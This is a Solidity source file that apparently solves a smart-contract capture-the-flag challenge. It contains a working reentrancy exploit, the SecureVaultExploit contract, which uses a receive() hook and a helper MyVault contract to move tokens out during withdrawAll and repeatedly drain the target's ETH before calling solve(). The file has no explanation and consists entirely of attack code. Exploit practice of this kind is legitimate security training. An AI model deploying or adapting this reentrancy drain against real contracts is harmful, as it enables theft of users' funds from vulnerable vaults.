// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoldToken {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface ISecureVault {
    function goldToken() external view returns (address);
    function deposit() external payable;
    function withdrawAll() external;
    function solve() external;
}

contract MyVault {
    ISecureVault public target;
    IGoldToken public goldToken;

    constructor(address _target) {
        target = ISecureVault(_target);
        goldToken = IGoldToken(target.goldToken());
    }

    function transfer() public {
        goldToken.transfer(msg.sender, goldToken.balanceOf(address(this)));
    }
}

contract SecureVaultExploit {
    ISecureVault public target;
    IGoldToken public goldToken;
    MyVault public myvault;
    bool public reentry = false;

    constructor(address _target, address _myvault) payable {
        myvault = MyVault(_myvault);
        target = ISecureVault(_target);
        goldToken = IGoldToken(target.goldToken());
    }

    function exploit() external {
        while (address(goldToken).balance > 0) {
            uint256 value = address(this).balance > address(goldToken).balance ? address(goldToken).balance : address(this).balance;
            
            target.deposit{value: value}();
            reentry = true;
            target.withdrawAll();
            reentry = false;
            myvault.transfer();
            target.withdrawAll();
        }

        target.solve();
    }

    receive() external payable {
        if (reentry) {
            goldToken.transfer(address(myvault), goldToken.balanceOf(address(this)));
        }
    }
}